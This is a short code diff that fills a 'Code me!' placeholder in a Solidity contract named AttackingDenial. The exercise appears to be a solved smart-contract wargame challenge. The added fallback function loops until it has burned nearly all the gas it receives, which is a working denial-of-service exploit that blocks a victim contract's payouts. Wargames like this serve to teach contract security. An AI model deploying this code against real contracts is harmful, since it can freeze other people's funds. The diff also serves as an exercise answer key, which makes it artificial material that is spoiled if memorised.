@@ -9,5 +9,8 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    fallback() external payable {
+        uint256 counter = 0;
+        while (gasleft() > 100) counter++;
+    }
 }
